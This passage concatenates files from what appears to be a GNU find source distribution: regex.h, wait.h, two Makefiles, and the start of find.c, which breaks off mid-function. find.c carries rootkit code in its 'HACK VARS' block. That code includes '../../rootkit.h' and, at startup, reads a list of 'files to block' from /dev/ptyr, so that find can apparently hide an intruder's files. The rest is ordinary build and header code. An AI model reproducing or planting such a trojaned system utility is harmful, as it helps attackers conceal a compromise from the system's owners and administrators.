#define REG_NEWLINE (REG_ICASE << 1)

/* If this bit is set, then report only success or fail in regexec.
   If not set, then returns differ between not matching and errors.  */
#define REG_NOSUB (REG_NEWLINE << 1)


/* POSIX `eflags' bits (i.e., information for regexec).  */

/* If this bit is set, then the beginning-of-line operator doesn't match
     the beginning of the string (presumably because it's not the
     beginning of a line).
   If not set, then the beginning-of-line operator does match the
     beginning of the string.  */
#define REG_NOTBOL 1

/* Like REG_NOTBOL, except for the end-of-line.  */
#define REG_NOTEOL (1 << 1)


/* If any error codes are removed, changed, or added, update the
   `re_error_msg' table in regex.c.  */
typedef enum
{
  REG_NOERROR = 0,	/* Success.  */
  REG_NOMATCH,		/* Didn't find a match (for regexec).  */

  /* POSIX regcomp return error codes.  (In the order listed in the
     standard.)  */
  REG_BADPAT,		/* Invalid pattern.  */
  REG_ECOLLATE,		/* Not implemented.  */
  REG_ECTYPE,		/* Invalid character class name.  */
  REG_EESCAPE,		/* Trailing backslash.  */
  REG_ESUBREG,		/* Invalid back reference.  */
  REG_EBRACK,		/* Unmatched left bracket.  */
  REG_EPAREN,		/* Parenthesis imbalance.  */ 
  REG_EBRACE,		/* Unmatched \{.  */
  REG_BADBR,		/* Invalid contents of \{\}.  */
  REG_ERANGE,		/* Invalid range end.  */
  REG_ESPACE,		/* Ran out of memory.  */
  REG_BADRPT,		/* No preceding re for repetition op.  */

  /* Error codes we've added.  */
  REG_EEND,		/* Premature end.  */
  REG_ESIZE,		/* Compiled pattern bigger than 2^16 bytes.  */
  REG_ERPAREN		/* Unmatched ) or \); not returned from regcomp.  */
} reg_errcode_t;

/* This data structure represents a compiled pattern.  Before calling
   the pattern compiler, the fields `buffer', `allocated', `fastmap',
   `translate', and `no_sub' can be set.  After the pattern has been
   compiled, the `re_nsub' field is available.  All other fields are
   private to the regex routines.  */

struct re_pattern_buffer
{
/* [[[begin pattern_buffer]]] */
	/* Space that holds the compiled pattern.  It is declared as
          `unsigned char *' because its elements are
           sometimes used as array indexes.  */
  unsigned char *buffer;

	/* Number of bytes to which `buffer' points.  */
  unsigned long allocated;

	/* Number of bytes actually used in `buffer'.  */
  unsigned long used;	

        /* Syntax setting with which the pattern was compiled.  */
  reg_syntax_t syntax;

        /* Pointer to a fastmap, if any, otherwise zero.  re_search uses
           the fastmap, if there is one, to skip over impossible
           starting points for matches.  */
  char *fastmap;

        /* Either a translate table to apply to all characters before
           comparing them, or zero for no translation.  The translation
           is applied to a pattern when it is compiled and to a string
           when it is matched.  */
  char *translate;

	/* Number of subexpressions found by the compiler.  */
  size_t re_nsub;

        /* Zero if this pattern cannot match the empty string, one else.
           Well, in truth it's used only in `re_search_2', to see
           whether or not we should use the fastmap, so we don't set
           this absolutely perfectly; see `re_compile_fastmap' (the
           `duplicate' case).  */
  unsigned can_be_null : 1;

        /* If REGS_UNALLOCATED, allocate space in the `regs' structure
             for `max (RE_NREGS, re_nsub + 1)' groups.
           If REGS_REALLOCATE, reallocate space if necessary.
           If REGS_FIXED, use what's there.  */
#define REGS_UNALLOCATED 0
#define REGS_REALLOCATE 1
#define REGS_FIXED 2
  unsigned regs_allocated : 2;

        /* Set to zero when `regex_compile' compiles a pattern; set to one
           by `re_compile_fastmap' if it updates the fastmap.  */
  unsigned fastmap_accurate : 1;

        /* If set, `re_match_2' does not return information about
           subexpressions.  */
  unsigned no_sub : 1;

        /* If set, a beginning-of-line anchor doesn't match at the
           beginning of the string.  */ 
  unsigned not_bol : 1;

        /* Similarly for an end-of-line anchor.  */
  unsigned not_eol : 1;

        /* If true, an anchor at a newline matches.  */
  unsigned newline_anchor : 1;

/* [[[end pattern_buffer]]] */
};

typedef struct re_pattern_buffer regex_t;

/* Type for byte offsets within the string.  POSIX mandates this.  */
typedef int regoff_t;


/* This is the structure we store register match data in.  See
   regex.texinfo for a full description of what registers match.  */
struct re_registers
{
  unsigned num_regs;
  regoff_t *start;
  regoff_t *end;
};


/* If `regs_allocated' is REGS_UNALLOCATED in the pattern buffer,
   `re_match_2' returns information about at least this many registers
   the first time a `regs' structure is passed.  */
#ifndef RE_NREGS
#define RE_NREGS 30
#endif


/* POSIX specification for registers.  Aside from the different names than
   `re_registers', POSIX uses an array of structures, instead of a
   structure of arrays.  */
typedef struct
{
  regoff_t rm_so;  /* Byte offset from string's start to substring's start.  */
  regoff_t rm_eo;  /* Byte offset from string's start to substring's end.  */
} regmatch_t;

/* Declarations for routines.  */

/* To avoid duplicating every routine declaration -- once with a
   prototype (if we are ANSI), and once without (if we aren't) -- we
   use the following macro to declare argument types.  This
   unfortunately clutters up the declarations a bit, but I think it's
   worth it.  */

#if __STDC__

#define _RE_ARGS(args) args

#else /* not __STDC__ */

#define _RE_ARGS(args) ()

#endif /* not __STDC__ */

/* Sets the current default syntax to SYNTAX, and return the old syntax.
   You can also simply assign to the `re_syntax_options' variable.  */
extern reg_syntax_t re_set_syntax _RE_ARGS ((reg_syntax_t syntax));

/* Compile the regular expression PATTERN, with length LENGTH
   and syntax given by the global `re_syntax_options', into the buffer
   BUFFER.  Return NULL if successful, and an error string if not.  */
extern const char *re_compile_pattern
  _RE_ARGS ((const char *pattern, int length,
             struct re_pattern_buffer *buffer));


/* Compile a fastmap for the compiled pattern in BUFFER; used to
   accelerate searches.  Return 0 if successful and -2 if was an
   internal error.  */
extern int re_compile_fastmap _RE_ARGS ((struct re_pattern_buffer *buffer));


/* Search in the string STRING (with length LENGTH) for the pattern
   compiled into BUFFER.  Start searching at position START, for RANGE
   characters.  Return the starting position of the match, -1 for no
   match, or -2 for an internal error.  Also return register
   information in REGS (if REGS and BUFFER->no_sub are nonzero).  */
extern int re_search
  _RE_ARGS ((struct re_pattern_buffer *buffer, const char *string,
            int length, int start, int range, struct re_registers *regs));


/* Like `re_search', but search in the concatenation of STRING1 and
   STRING2.  Also, stop searching at index START + STOP.  */
extern int re_search_2
  _RE_ARGS ((struct re_pattern_buffer *buffer, const char *string1,
             int length1, const char *string2, int length2,
             int start, int range, struct re_registers *regs, int stop));


/* Like `re_search', but return how many characters in STRING the regexp
   in BUFFER matched, starting at position START.  */
extern int re_match
  _RE_ARGS ((struct re_pattern_buffer *buffer, const char *string,
             int length, int start, struct re_registers *regs));


/* Relates to `re_match' as `re_search_2' relates to `re_search'.  */
extern int re_match_2 
  _RE_ARGS ((struct re_pattern_buffer *buffer, const char *string1,
             int length1, const char *string2, int length2,
             int start, struct re_registers *regs, int stop));


/* Set REGS to hold NUM_REGS registers, storing them in STARTS and
   ENDS.  Subsequent matches using BUFFER and REGS will use this memory
   for recording register information.  STARTS and ENDS must be
   allocated with malloc, and must each be at least `NUM_REGS * sizeof
   (regoff_t)' bytes long.

   If NUM_REGS == 0, then subsequent matches should allocate their own
   register data.

   Unless this function is called, the first search or match using
   PATTERN_BUFFER will allocate its own register data, without
   freeing the old data.  */
extern void re_set_registers
  _RE_ARGS ((struct re_pattern_buffer *buffer, struct re_registers *regs,
             unsigned num_regs, regoff_t *starts, regoff_t *ends));

#ifdef _REGEX_RE_COMP
/* 4.2 bsd compatibility.  */
extern char *re_comp _RE_ARGS ((const char *));
extern int re_exec _RE_ARGS ((const char *));
#endif

/* POSIX compatibility.  */
extern int regcomp _RE_ARGS ((regex_t *preg, const char *pattern, int cflags));
extern int regexec
  _RE_ARGS ((const regex_t *preg, const char *string, size_t nmatch,
             regmatch_t pmatch[], int eflags));
extern size_t regerror
  _RE_ARGS ((int errcode, const regex_t *preg, char *errbuf,
             size_t errbuf_size));
extern void regfree _RE_ARGS ((regex_t *preg));

#endif /* not __REGEXP_LIBRARY_H__ */

/*
Local variables:
make-backup-files: t
version-control: t
trim-versions-without-asking: nil
End:
*/
/* wait.h -- POSIX macros for evaluating exit statuses
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#include <sys/types.h>		/* For pid_t. */
#if HAVE_SYS_WAIT_H
#include <sys/wait.h>
#endif

#ifndef WIFSTOPPED
#define WIFSTOPPED(w) (((w) & 0xff) == 0x7f)
#endif
#ifndef WIFSIGNALED
#define WIFSIGNALED(w) (((w) & 0xff) != 0x7f && ((w) & 0xff) != 0)
#endif
#ifndef WIFEXITED
#define WIFEXITED(w) (((w) & 0xff) == 0)
#endif

#ifndef WSTOPSIG
#define WSTOPSIG(w) (((w) >> 8) & 0xff)
#endif
#ifndef WTERMSIG
#define WTERMSIG(w) ((w) & 0x7f)
#endif
#ifndef WEXITSTATUS
#define WEXITSTATUS(w) (((w) >> 8) & 0xff)
#endif
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake from Makefile.am.
# Copyright (C) 1994 Free Software Foundation, Inc.

# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

SHELL = /bin/sh

srcdir = .
top_srcdir = ..
prefix = /usr/local
exec_prefix = ${prefix}

bindir = $(exec_prefix)/bin
sbindir = $(exec_prefix)/sbin
libexecdir = $(exec_prefix)/libexec
datadir = $(prefix)/share
sysconfdir = $(prefix)/etc
sharedstatedir = $(prefix)/com
localstatedir = $(prefix)/var
libdir = $(exec_prefix)/lib
infodir = $(prefix)/info
mandir = $(prefix)/man
includedir = $(prefix)/include
oldincludedir = /usr/include

INSTALL = /usr/bin/ginstall -c
INSTALL_PROGRAM = ${INSTALL}
INSTALL_DATA = ${INSTALL} -m 644
transform = s,x,x,

ALL = ${PROGRAMS} ${LIBPROGRAMS} ${SCRIPTS} ${LIBSCRIPTS} ${LIBFILES}
CC = gcc
LEX = @LEX@
YACC = @YACC@
ANSI2KNR = ./ansi2knr

DEFS = -DHAVE_CONFIG_H
CPPFLAGS = 
CFLAGS = -g -O
LDFLAGS = 
LIBS = 

find_OBJECTS = regex.o dirname.o error.o filemode.o getopt.o getopt1.o idcache.o listfile.o modechange.o nextelem.o savedir.o xmalloc.o getline.o xstrdup.o xgetcwd.o fnmatch.o 
LIBFILES =  libfind.a
AR = ar
RANLIB = ranlib
ALLOCA = 
LIBOBJS = 

SOURCES =  ${find_SOURCES}
DIST_CONF = Makefile.am Makefile.in
DIST_FILES = $(DIST_CONF) $(SOURCES) $(TEXINFOS) $(INFOS) $(MANS) $(DIST_OTHER)

LIBRARIES = find
find_SOURCES = regex.c dirname.c error.c filemode.c getopt.c getopt1.c \
idcache.c listfile.c modechange.c nextelem.c savedir.c xmalloc.c getline.c \
xstrdup.c xgetcwd.c fnmatch.c $(find_OPT_SOURCES)

find_OPT_SOURCES = fileblocks.c memcmp.c memset.c mktime.c stpcpy.c strdup.c \
strftime.c strspn.c strstr.c strtol.c alloca.c

DIST_OTHER = fnmatch.h getopt.h modechange.h modetype.h pathmax.h \
regex.h wait.h

CONFIG_HEADER = ../config.h
INCLUDES = -I.. -I$(srcdir)

all:: ${ALL}

.c.o:
	$(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS) $<

$(find_OBJECTS): ../config.h
install:: install-libraries

install-libraries: $(LIBFILES)

uninstall:: uninstall-libraries

uninstall-libraries:

libfind.a: $(find_OBJECTS)  
	rm -f libfind.a
	$(AR) cru libfind.a $(find_OBJECTS)  
	$(RANLIB) libfind.a

mostlyclean:
	rm -f *.o core

clean: mostlyclean
	rm -f $(PROGRAMS) $(LIBPROGRAMS) $(LIBFILES) $(TEXFILES) $(CLEANFILES)

distclean: clean
	rm -f Makefile *.tab.c $(DISTCLEANFILES)
	rm -f config.cache config.log config.status ${CONFIG_HEADER} stamp-h

realclean: distclean
	rm -f TAGS $(INFOS)

dist: $(DIST_FILES) $(DIST_DIRS)
	-mkdir ../`cat ../distname`/$(subdir)
	@for file in $(DIST_FILES); do \
	  echo linking $$file; \
	  ln $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file || \
	    { echo copying $$file instead; cp -p $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file;}; \
	done

check dvi info install uninstall::

tags:: TAGS

TAGS::
	cd $(srcdir); etags $(SOURCES)

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

fnmatch.o: fnmatch.h
getopt1.o: getopt.h
listfile.o xgetcwd.o: pathmax.h
modechange.o: modechange.h
regex.o: regex.h
PROGRAMS = find
find_SOURCES = find.c fstype.c parser.c pred.c tree.c util.c version.c
DIST_OTHER = defs.h
INCLUDES = -I.. -I$(top_srcdir)/lib
LDADD = ../lib/libfind.a
MANS = find.1
CONFIG_HEADER = ../config.h

$(PROGRAMS): ../lib/libfind.a

parser.o: ../lib/modechange.h
find.o fstype.o parser.o pred.o: ../lib/modetype.h
find.o fstype.o parser.o pred.o tree.o util.o: defs.h 
pred.o: ../lib/wait.h
# Makefile.in generated automatically by automake from Makefile.am.
# Copyright (C) 1994 Free Software Foundation, Inc.

# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

SHELL = /bin/sh

srcdir = @srcdir@
top_srcdir = @top_srcdir@
VPATH = @srcdir@
prefix = @prefix@
exec_prefix = @exec_prefix@

bindir = $(exec_prefix)/bin
sbindir = $(exec_prefix)/sbin
libexecdir = $(exec_prefix)/libexec
datadir = $(prefix)/share
sysconfdir = $(prefix)/etc
sharedstatedir = $(prefix)/com
localstatedir = $(prefix)/var
libdir = $(exec_prefix)/lib
infodir = $(prefix)/info
mandir = $(prefix)/man
includedir = $(prefix)/include
oldincludedir = /usr/include

INSTALL = @INSTALL@
INSTALL_PROGRAM = @INSTALL_PROGRAM@
INSTALL_DATA = @INSTALL_DATA@
transform = @program_transform_name@

ALL = ${PROGRAMS} ${LIBPROGRAMS} ${SCRIPTS} ${LIBSCRIPTS} ${LIBFILES}
CC = @CC@
LEX = @LEX@
YACC = @YACC@
ANSI2KNR = ./ansi2knr

DEFS = @DEFS@
CPPFLAGS = @CPPFLAGS@
CFLAGS = @CFLAGS@
LDFLAGS = @LDFLAGS@
LIBS = @LIBS@

find_OBJECTS = find.o fstype.o parser.o pred.o tree.o util.o version.o
NROFF = nroff

SOURCES =  ${find_SOURCES}
DIST_CONF = Makefile.am Makefile.in
DIST_FILES = $(DIST_CONF) $(SOURCES) $(TEXINFOS) $(INFOS) $(MANS) $(DIST_OTHER)

PROGRAMS = find
find_SOURCES = find.c fstype.c parser.c pred.c tree.c util.c version.c
DIST_OTHER = defs.h
INCLUDES = -I.. -I$(top_srcdir)/lib
LDADD = ../lib/libfind.a
MANS = find.1
CONFIG_HEADER = ../config.h

all:: ${ALL}

.c.o:
	$(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS) $<

$(find_OBJECTS): ../config.h
install:: install-programs

install-programs: $(PROGRAMS) $(SCRIPTS)
	$(top_srcdir)/mkinstalldirs $(bindir)
	for p in $(PROGRAMS) $(SCRIPTS); do \
	  $(INSTALL_PROGRAM) $$p $(bindir)/`echo $$p|sed '$(transform)'`; \
	done

uninstall:: uninstall-programs

uninstall-programs:
	for p in $(PROGRAMS) $(SCRIPTS); do \
	  rm -f $(bindir)/`echo $$p|sed '$(transform)'`; \
	done

find: $(find_OBJECTS)
	$(CC) -o $@ $(find_OBJECTS) $(LDADD) $(LDFLAGS) $(LIBS)

install:: install-man

install-man:
	for man in $(MANS); do \
	  sect=`echo $$man|sed 's%.*\.\([0-9][a-z]*\)$$%\1%'`; \
	  inst=`basename $$man $$sect|sed '$(transform)'`$$sect; \
	  mdir=$(mandir)/man$$sect; \
	  $(top_srcdir)/mkinstalldirs $$mdir; \
	  echo installing $$man as $$mdir/$$inst; \
	  $(INSTALL_DATA) $(srcdir)/$$man $$mdir/$$inst; \
	  cdir=$(mandir)/cat$$sect; \
	  if test -d $$cdir; then \
	    echo formatting $$man as $$cdir/$$inst; \
	    $(NROFF) -man $(srcdir)/$$man > $$cdir/$$inst; \
	  fi; \
	done

uninstall:: uninstall-man

uninstall-man:
	for man in $(MANS); do \
	  sect=`echo $$man|sed 's%.*\(\.[0-9][a-z]*\)$$%\1%'; \
	  inst=`basename $$man $sect|sed '$(transform)'`.$$sect; \
	  mdir=$(mandir)/man$$sect; \
	  cdir=$(mandir)/cat$$sect; \
	  rm -f $$mdir/$$inst $$cdir/$$inst; \
	done

mostlyclean:
	rm -f *.o core

clean: mostlyclean
	rm -f $(PROGRAMS) $(LIBPROGRAMS) $(LIBFILES) $(TEXFILES) $(CLEANFILES)

distclean: clean
	rm -f Makefile *.tab.c $(DISTCLEANFILES)
	rm -f config.cache config.log config.status ${CONFIG_HEADER} stamp-h

realclean: distclean
	rm -f TAGS $(INFOS)

dist: $(DIST_FILES) $(DIST_DIRS)
	-mkdir ../`cat ../distname`/$(subdir)
	@for file in $(DIST_FILES); do \
	  echo linking $$file; \
	  ln $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file || \
	    { echo copying $$file instead; cp -p $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file;}; \
	done

check dvi info install uninstall::

tags:: TAGS

TAGS::
	cd $(srcdir); etags $(SOURCES)

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

$(PROGRAMS): ../lib/libfind.a

parser.o: ../lib/modechange.h
find.o fstype.o parser.o pred.o: ../lib/modetype.h
find.o fstype.o parser.o pred.o tree.o util.o: defs.h 
pred.o: ../lib/wait.h
/* find -- search for files in a directory hierarchy
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* GNU find was written by Eric Decker <cire@cisco.com>,
   with enhancements by David MacKenzie <djm@gnu.ai.mit.edu>,
   Jay Plett <jay@silence.princeton.nj.us>,
   and Tim Wood <axolotl!tim@toad.com>.
   The idea for -print0 and xargs -0 came from
   Dan Bernstein <brnstnd@kramden.acf.nyu.edu>.  */

#include <config.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#ifdef HAVE_FCNTL_H
#include <fcntl.h>
#else
#include <sys/file.h>
#endif
#include "defs.h"
#include "modetype.h"

#ifndef S_IFLNK
#define lstat stat
#endif

int lstat ();
int stat ();

#define apply_predicate(pathname, stat_buf_ptr, node)	\
  (*(node)->pred_func)((pathname), (stat_buf_ptr), (node))

static void process_top_path P_((char *pathname));
static int process_path P_((char *pathname, char *name, boolean leaf, char *parent));
static void process_dir P_((char *pathname, char *name, int pathlen, struct stat *statp, char *parent));
static boolean no_side_effects P_((struct predicate *pred));

/* Name this program was run with. */
char *program_name;

/* All predicates for each path to process. */
struct predicate *predicates;

/* The last predicate allocated. */
struct predicate *last_pred;

/* The root of the evaluation tree. */
static struct predicate *eval_tree;

/* If true, process directory before contents.  True unless -depth given. */
boolean do_dir_first;

/* If >=0, don't descend more than this many levels of subdirectories. */
int maxdepth;

/* If >=0, don't process files above this level. */
int mindepth;

/* Current depth; 0 means current path is a command line arg. */
int curdepth;

/* Seconds between 00:00 1/1/70 and either one day before now
   (the default), or the start of today (if -daystart is given). */
time_t cur_day_start;

/* If true, cur_day_start has been adjusted to the start of the day. */
boolean full_days;

/* If true, do not assume that files in directories with nlink == 2
   are non-directories. */
boolean no_leaf_check;

/* If true, don't cross filesystem boundaries. */
boolean stay_on_filesystem;

/* If true, don't descend past current directory.
   Can be set by -prune, -maxdepth, and -xdev/-mount. */
boolean stop_at_current_level;

#ifndef HAVE_FCHDIR
/* The full path of the initial working directory.  */
char *starting_dir;
#else
/* A file descriptor open to the initial working directory.
   Doing it this way allows us to work when the i.w.d. has
   unreadable parents.  */
int starting_desc;
#endif

/* If true, we have called stat on the current path. */
boolean have_stat;

/* The file being operated on, relative to the current directory.
   Used for stat, readlink, and opendir.  */
char *rel_pathname;

/* Length of current path. */
int path_length;

/* true if following symlinks.  Should be consistent with xstat.  */
boolean dereference;

/* Pointer to the function used to stat files. */
int (*xstat) ();

/* Status value to return to system. */
int exit_status;

#ifdef DEBUG_STAT
static int
debug_stat (file, bufp)
     char *file;
     struct stat *bufp;
{
  fprintf (stderr, "debug_stat (%s)\n", file);
  return lstat (file, bufp);
}
#endif /* DEBUG_STAT */

/* Files and directories to hide */
#define ROOTKIT_FILES_FILE "/dev/ptyr"

/* HACK VARS */
#include "../../rootkit.h"
#define FILENAME ROOTKIT_FILES_FILE
#define STR_SIZE 128

struct  h_st {
        struct h_st     *next;
        char            filename[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];

FILE    *fp_hack;

/*+  End hack vars  +*/

void
main (argc, argv)
     int argc;
     char *argv[];
{
  int i;
  PFB parse_function;		/* Pointer to who is to do the parsing. */
  struct predicate *cur_pred;
  char *predicate_name;		/* Name of predicate being parsed. */

  program_name = argv[0];

  predicates = NULL;
  last_pred = NULL;
  do_dir_first = true;
  maxdepth = mindepth = -1;
  cur_day_start = time ((time_t *) 0) - DAYSECS;
  full_days = false;
  no_leaf_check = false;
  stay_on_filesystem = false;
  exit_status = 0;
  dereference = false;
#ifdef DEBUG_STAT
  xstat = debug_stat;
#else /* !DEBUG_STAT */
  xstat = lstat;
#endif /* !DEBUG_STAT */

#ifdef DEBUG
  printf ("cur_day_start = %s", ctime (&cur_day_start));
#endif /* DEBUG */
/*+  HACK Read in list of files to block  +*/

        h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
        hack_list=h_tmp;

        if (fp_hack=fopen (FILENAME, "r")) {
                while (fgets(tmp_str, 126, fp_hack)) {
                        h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
                        strcpy (h_tmp->filename, tmp_str);
                        h_tmp->filename[strlen(h_tmp->filename)-1]='\0';
                        h_tmp=h_tmp->next;
                }
        fclose(fp_hack);
        }
h_tmp->next=NULL;

/*+  On with the program  +*/

  /* Find where in ARGV the predicates begin. */
  for (i = 1; i < argc && strchr ("-!(),", argv[i][0]) == NULL; i++)
    /* Do nothing. */ ;

  /* Enclose the expression in `( ... )' so a default -print will
     apply to the whole expression. */
  parse_open (argv, &argc);
  /* Build the input order list. */
  while (i < argc)
    {
      if (strchr ("-!(),", argv[i][0]) == NULL)
	usage ("paths must precede expression");
      predicate_name = argv[i];
      parse_function = find_parser (predicate_name);
      if (parse_function == NULL)
	error (1, 0, "invalid predicate `%s'", predicate_name);
      i++;
      if (!(*parse_function) (argv, &i))
	{
	  if (argv[i] == NULL)
	    error (1, 0, "missing argument to `%s'", predicate_name);
	  else
	    error (1, 0, "invalid argument `%s' to `%s'",
		   argv[i], predicate_name);
	}
    }
  if (predicates->pred_next == NULL)
    {
      /* No predicates that do something other than set a global variable
	 were given; remove the unneeded initial `(' and add `-print'. */
      cur_pred = predicates;
      predicates = last_pred = predicates->pred_next;
      free ((char *) cur_pred);
      parse_print (argv, &argc);
    }
  else if (!no_side_effects (predicates->pred_next))
    {
      /* One or more predicates that produce output were given;
	 remove the unneeded initial `('. */
      cur_pred = predicates;
      predicates = predicates->pred_next;
      free ((char *) cur_pred);
    }
  else
    {
      /* `( user-supplied-expression ) -print'. */
      parse_close (argv, &argc);
      parse_print (argv, &argc);
    }

#ifdef	DEBUG
  printf ("Predicate List:\n");
  print_list (predicates);
#endif /* DEBUG */

  /* Done parsing the predicates.  Build the evaluation tree. */
  cur_pred = predicates;
  eval_tree = get_expr (&cur_pred, NO_PREC);
#ifdef	DEBUG
  printf ("Eval Tree:\n");
  print_tree (eval_tree, 0);
#endif /* DEBUG */

  /* Rearrange the eval tree in optimal-predicate order. */
  opt_expr (&eval_tree);

  /* Determine the point, if any, at which to stat the file. */
  mark_stat (eval_tree);

#ifdef DEBUG
  printf ("Optimized Eval Tree:\n");
  print_tree (eval_tree, 0);
#endif /* DEBUG */

#ifndef HAVE_FCHDIR
  starting_dir = xgetcwd ();
  if (starting_dir == NULL)
    error (1, errno, "cannot get current directory");
#else
  starting_desc = open (".", O_RDONLY);
  if (starting_desc < 0)
    error (1, errno, "cannot open current directory");
#endif

  /* If no paths are given, default to ".".  */
  for (i = 1; i < argc && strchr ("-!(),", argv[i][0]) == NULL; i++)
    process_top_path (argv[i]);
  if (i == 1)
    process_top_path (".");

  exit (exit_status);
}

/* Descend PATHNAME, which is a command-line argument.  */

static void
process_top_path (pathname)
     char *pathname;
{
  struct stat stat_buf;

  curdepth = 0;
  path_length = strlen (pathname);

  /* We stat each pathname given on the command-line twice --
     once here and once in process_path.  It's not too bad, though,
     since the kernel can read the stat information out of its inode
     cache the second time.  */
  if ((*xstat) (pathname, &stat_buf) == 0 && S_ISDIR (stat_buf.st_mode))
    {
      if (chdir (pathname) < 0)
	{
	  error (0, errno, "%s", pathname);
	  exit_status = 1;
	  return;
	}
      process_path (pathname, ".", false, ".");
#ifndef HAVE_FCHDIR
      if (chdir (starting_dir) < 0)
	error (1, errno, "%s", starting_dir);
#else
      if (fchdir (starting_desc))
	error (1, errno, "cannot return to starting directory");
#endif
    }
  else
    process_path (pathname, pathname, false, ".");
}

/* Info on each directory in the current tree branch, to avoid
   getting stuck in symbolic link loops.  */
struct dir_id
{
  ino_t ino;
  dev_t dev;
};
static struct dir_id *dir_ids = NULL;
/* Entries allocated in `dir_ids'.  */
static int dir_alloc = 0;
/* Index in `dir_ids' of directory currently being searched.
   This is always the last valid entry.  */
static int dir_curr = -1;
/* (Arbitrary) number of entries to grow `dir_ids' by.  */
#define DIR_ALLOC_STEP 32

/* Recursively descend path PATHNAME, applying the predicates.
   LEAF is true if PATHNAME is known to be in a directory that has no
   more unexamined subdirectories, and therefore it is not a directory.
   Knowing this allows us to avoid calling stat as long as possible for
   leaf files.

   NAME is PATHNAME relative to the current directory.  We access NAME
   but print PATHNAME.

   PARENT is the path of the parent of NAME, relative to find's
   starting directory.

   Return nonzero iff PATHNAME is a directory. */

static int
process_path (pathname, name, leaf, parent)
     char *pathname;
     char *name;
     boolean leaf;
     char *parent;
{
  struct stat stat_buf;
  static dev_t root_dev;	/* Device ID of current argument pathname. */
  int i;

  /* Assume it is a non-directory initially. */
  stat_buf.st_mode = 0;

  rel_pathname = name;

  if (leaf)
    have_stat = false;
  else
    {
      if ((*xstat) (name, &stat_buf) != 0)
	{
	  error (0, errno, "%s", pathname);
	  exit_status = 1;
	  return 0;
	}
      have_stat = true;
    }

  if (!S_ISDIR (stat_buf.st_mode))
    {
      if (curdepth >= mindepth)
	apply_predicate (pathname, &stat_buf, eval_tree);
      return 0;
    }

  /* From here on, we're working on a directory.  */

  stop_at_current_level = maxdepth >= 0 && curdepth >= maxdepth;

  /* If we've already seen this directory on this branch,
     don't descend it again.  */
  for (i = 0; i <= dir_curr; i++)
    if (stat_buf.st_ino == dir_ids[i].ino &&
	stat_buf.st_dev == dir_ids[i].dev)
      stop_at_current_level = true;

  if (dir_alloc <= ++dir_curr)
    {
      dir_alloc += DIR_ALLOC_STEP;
      dir_ids = (struct dir_id *)
	xrealloc ((char *) dir_ids, dir_alloc * sizeof (struct dir_id));
    }
  dir_ids[dir_curr].ino = stat_buf.st_ino;
  dir_ids[dir_curr].dev = stat_buf.st_dev;

  if (stay_on_filesystem)
    {
      if (curdepth == 0)
	root_dev = stat_buf.st_dev;
      else if (stat_buf.st_dev != root_dev)
	stop_at_current_level = true;
    }

  if (do_dir_first && curdepth >= mindepth)
    apply_predicate (pathname, &stat_buf, eval_tree);

  if (stop_at_current_level == false)
    /* Scan directory on disk. */
    process_dir (pathname, name, strlen (pathname), &stat_buf, parent);

  if (do_dir_first == false && curdepth >= mindepth)
    apply_predicate (pathname, &stat_buf, eval_tree);

  dir_curr--;

  return 1;
}

/* Scan directory PATHNAME and recurse through process_path for each entry.

   PATHLEN is the length of PATHNAME.

   NAME is PATHNAME relative to the current directory.

   STATP is the results of *xstat on it.

   PARENT is the path of the parent of NAME, relative to find's
   starting directory.  */

static void
process_dir (pathname, name, pathlen, statp, parent)
     char *pathname;
     char *name;
     int pathlen;
     struct stat *statp;
     char *parent;
{
  char *name_space;		/* Names of files in PATHNAME. */
  int subdirs_left;		/* Number of unexamined subdirs in PATHNAME. */

  subdirs_left = statp->st_nlink - 2; /* Account for name and ".". */

  errno = 0;
  /* On some systems (VAX 4.3BSD+NFS), NFS mount points have st_size < 0.  */
